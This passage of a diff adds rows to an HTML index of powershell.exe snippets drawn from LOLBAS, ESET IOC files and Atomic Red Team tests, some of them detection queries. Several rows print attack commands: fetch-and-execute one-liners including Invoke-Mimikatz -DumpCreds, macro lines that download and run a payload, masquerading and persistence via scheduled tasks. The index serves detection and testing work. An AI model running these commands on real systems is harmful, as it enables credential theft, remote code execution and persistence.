+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Agentexecutor.yml">Agentexecutor.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">Description: If we place a binary named powershell.exe in the path c:\temp, agentexecutor.exe will execute it successfully</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Appvlp.yml">Appvlp.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- Command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe','', '', 'open', 1)"</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Appvlp.yml">Appvlp.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">Description: Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Appvlp.yml">Appvlp.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- Command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')"</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Mftrace.yml">Mftrace.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- Command: Mftrace.exe powershell.exe</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Mftrace.yml">Mftrace.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">Usecase: Local execution of powershell.exe as a subprocess of Mftrace.exe.</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/eset/malware-ioc">malware-ioc</a></td>
+      <td><a href="https://github.com/eset/malware-ioc/blob/master/dukes/misp-dukes-operation-ghost-event.json">misp-dukes-operation-ghost-event.json</a></td>
+      <td><code class="language-plaintext highlighter-rouge">"description": "PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. \n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nAdministrator permissions are required to use PowerShell to connect to remote systems.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack)\n\nPowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015) (Citation: Microsoft PSfromCsharp APR 2014)",</code></td>
+      <td><a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/eset/malware-ioc">malware-ioc</a></td>
+      <td><a href="https://github.com/eset/malware-ioc/blob/master/dukes/misp-dukes-operation-ghost-event.json">misp-dukes-operation-ghost-event.json</a></td>
+      <td><code class="language-plaintext highlighter-rouge">"https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/",</code></td>
+      <td><a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/eset/malware-ioc">malware-ioc</a></td>
+      <td><a href="https://github.com/eset/malware-ioc/blob/master/invisimole/misp_invisimole.json">misp_invisimole.json</a></td>
+      <td><code class="language-plaintext highlighter-rouge">"description": "Adversaries may implement hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. Adversaries may abuse operating system functionality to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.\n\n### Windows\nThere are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1086), Jscript, and VBScript to make windows hidden. One example of this is &lt;code&gt;powershell.exe -WindowStyle Hidden&lt;/code&gt;.  (Citation: PowerShell About 2019)\n\n### Mac\nThe configurations for how applications run on macOS are listed in property list (plist) files. One of the tags in these files can be &lt;code&gt;apple.awt.UIElement&lt;/code&gt;, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock. However, adversaries can abuse this feature and hide their running window.(Citation: Antiquated Mac Malware)\n",</code></td>
+      <td><a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/eset/malware-ioc">malware-ioc</a></td>
+      <td><a href="https://github.com/eset/malware-ioc/blob/master/oceanlotus/oceanlotus-rtf_ocx_campaigns.misp.event.json">oceanlotus-rtf_ocx_campaigns.misp.event.json</a></td>
+      <td><code class="language-plaintext highlighter-rouge">"description": "An adversary may rely upon specific actions by a user in order to gain execution. This may be direct code execution, such as when a user opens a malicious executable delivered via Spearphishing Attachment with the icon and apparent extension of a document file. It also may lead to other execution techniques, such as when a user clicks on a link delivered via Spearphishing Link that leads to exploitation of a browser or application vulnerability via Exploitation for Client Execution. While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it.\n\nDetection: Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain Initial Access that require user interaction. This includes compression applications, such as those for zip files, that can be used to Deobfuscate\/Decode Files or Information in payloads.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded and execuited on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as Exploitation for Client Execution and Scripting.\n\nPlatforms: Linux, Windows, macOS\n\nData Sources: Anti-virus, Process command-line parameters, Process monitoring\n\nPermissions Required: User",</code></td>
+      <td><a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/eset/malware-ioc">malware-ioc</a></td>
+      <td><a href="https://github.com/eset/malware-ioc/blob/master/oceanlotus/oceanlotus-rtf_ocx_campaigns.misp.event.json">oceanlotus-rtf_ocx_campaigns.misp.event.json</a></td>
+      <td><code class="language-plaintext highlighter-rouge">"description": "Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.\n\nDetection: Network intrusion detection systems and email gateways can be used to detect spearphishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.\n\nAnti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the attachment is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as Exploitation for Client Execution and Scripting.\n\nPlatforms: Linux, Windows, macOS\n\nData Sources: File monitoring, Packet capture, Mail server, Network intrusion detection system, Detonation chamber, Email gateway",</code></td>
+      <td><a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Atomic_Friday/2020-06-05/Atomic_Friday.md">Atomic_Friday.md</a></td>
+      <td>(index=”botsv3” OR index=”botsv2”) powershell.exe source=”WinEventLog:Microsoft-Windows-Sysmon/Operational” | stats values(CommandLine) by Computer</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Atomic_Friday/2020-06-05/Atomic_Friday.md">Atomic_Friday.md</a></td>
+      <td><code class="language-plaintext highlighter-rouge">(index="botsv3" OR index="botsv2") source="WinEventLog:Microsoft-Windows-Sysmon/Operational" schtasks.exe ParentImage=*\\powershell.exe\| stats values(Image) by ParentImage ParentCommandLine</code></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Atomic_Friday/2020-06-05/Atomic_Friday.md">Atomic_Friday.md</a></td>
+      <td><code class="language-plaintext highlighter-rouge">(index="botsv3" OR index="botsv2") source="WinEventLog:Microsoft-Windows-Sysmon/Operational" schtasks.exe CommandLine=*powershell.exe*\| stats values(CommandLine) by Computer</code></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Atomic_Friday/2020-06-05/Atomic_Friday.md">Atomic_Friday.md</a></td>
+      <td><code class="language-plaintext highlighter-rouge">(index="botsv3" OR index="botsv2") powershell.exe source="WinEventLog:Microsoft-Windows-PowerShell/Operational"</code></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Atomic_Friday/2020-06-05/Atomic_Friday.md">Atomic_Friday.md</a></td>
+      <td><code class="language-plaintext highlighter-rouge">(index="botsv3" OR index="botsv2") powershell.exe source="WinEventLog:Microsoft-Windows-Sysmon/Operational" \| stats values(CommandLine) by Computer</code></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Initial_Access/Office_Macro_COM.md">Office_Macro_COM.md</a></td>
+      <td>SW.Document.Application.ShellExecute “cmd.exe”, “/c powershell.exe IWR -uri ““https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.bat”” -OutFile “”~\Documents\payload.bat”” ; ~\Documents\payload.bat”, “C:\Windows\System32”, Null, 0</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Initial_Access/Office_Macro_COM.md">Office_Macro_COM.md</a></td>
+      <td>objProcess.Create “cmd.exe /c powershell.exe IEX ( IWR -uri ‘https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1’)”, Null, objConfig, intProcessID</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Initial_Access/Office_Macro_COM.md">Office_Macro_COM.md</a></td>
+      <td>objProcess.Create “cmd.exe /c powershell.exe IEX ( IWR -uri ‘https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/dragonstail_benign.ps1’)”, Null, objConfig, intProcessID</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md">index.md</a></td>
+      <td>- Atomic Test #5: Masquerading - powershell.exe running as taskhostw.exe [windows]</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md">windows-index.md</a></td>
+      <td>- Atomic Test #5: Masquerading - powershell.exe running as taskhostw.exe [windows]</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027/T1027.md">T1027.md</a></td>
+      <td>powershell.exe -EncodedCommand $EncodedCommand</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027/T1027.md">T1027.md</a></td>
+      <td>powershell.exe -Command “IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))”</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md">T1036.003.md</a></td>
+      <td>- <a href="#atomic-test-5---masquerading---powershellexe-running-as-taskhostwexe">Atomic Test #5 - Masquerading - powershell.exe running as taskhostw.exe</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md">T1036.003.md</a></td>
+      <td>## Atomic Test #5 - Masquerading - powershell.exe running as taskhostw.exe</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md">T1036.003.md</a></td>
+      <td>Copies powershell.exe, renames it, and launches it to masquerade as an instance of taskhostw.exe.</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md">T1036.003.md</a></td>
+      <td>Upon successful execution, powershell.exe is renamed as taskhostw.exe and executed from non-standard path.</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md">T1036.003.md</a></td>
+      <td>copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\taskhostw.exe /Y</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md">T1036.003.md</a></td>
+      <td>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.doc.ps1</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md">T1036.003.md</a></td>
+      <td>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.pdf.ps1</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md">T1036.003.md</a></td>
+      <td>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.rtf.ps1</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.004/T1036.004.md">T1036.004.md</a></td>
+      <td>schtasks /create /ru system /sc daily /tr “cmd /c powershell.exe -ep bypass -file c:\T1036.004_NonExistingScript.ps1” /tn win32times /f</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1049/T1049.md">T1049.md</a></td>
+      <td>Upon successful execution, powershell.exe will execute <code class="language-plaintext highlighter-rouge">get-NetTCPConnection</code>. Results will output via stdout.</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md">T1053.005.md</a></td>
+      <td>Upon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055/T1055.md">T1055.md</a></td>
+      <td>Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md">T1059.001.md</a></td>
+      <td>PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell’s underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)&lt;/blockquote&gt;</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md">T1059.001.md</a></td>
+      <td>powershell.exe “IEX (New-Object Net.WebClient).DownloadString(‘#{mimurl}’); Invoke-Mimikatz -DumpCreds”</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md">T1059.001.md</a></td>
+      <td>Powershell.exe “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1’); Invoke-AppPathBypass -Payload ‘C:\Windows\System32\cmd.exe’”</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md">T1059.001.md</a></td>
+      <td>powershell.exe -exec bypass -noprofile “$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open(‘GET’,’#{url}’,$False);$comMsXml.Send();IEX $comMsXml.ResponseText”</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md">T1059.001.md</a></td>
+      <td>“C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe” -exec bypass -noprofile “$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load(‘#{url}’);$Xml.command.a.execute | IEX”</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md">T1059.001.md</a></td>
+      <td>powershell.exe -version 2 -Command Write-Host $PSVersion</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md">T1059.001.md</a></td>
+      <td>Executes powershell.exe with variations of the -Command parameter</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md">T1059.001.md</a></td>
+      <td>Executes powershell.exe with variations of the -Command parameter with encoded arguments supplied</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md">T1059.001.md</a></td>
+      <td>Executes powershell.exe with variations of the -EncodedCommand parameter</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md">T1059.001.md</a></td>
+      <td>Executes powershell.exe with variations of the -EncodedCommand parameter with encoded arguments supplied</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1123/T1123.md">T1123.md</a></td>
+      <td>powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.004/T1134.004.md">T1134.004.md</a></td>
+      <td>Spawns a powershell.exe process as a child of the current process.</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.004/T1134.004.md">T1134.004.md</a></td>
+      <td>| file_path | File path or name of process to spawn | path | $Env:windir\System32\WindowsPowerShell\v1.0\powershell.exe|</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.004/T1134.004.md">T1134.004.md</a></td>
+      <td>Creates a notepad.exe process and then spawns a powershell.exe process as a child of it.</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.md">T1543.003.md</a></td>
+      <td>sc config Fax binPath= “C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c "write-host ‘T1543.003 Test’"”</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md">T1547.001.md</a></td>
+      <td>| thing_to_execute | Thing to Run | Path | powershell.exe|</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.003/T1564.003.md">T1564.003.md</a></td>
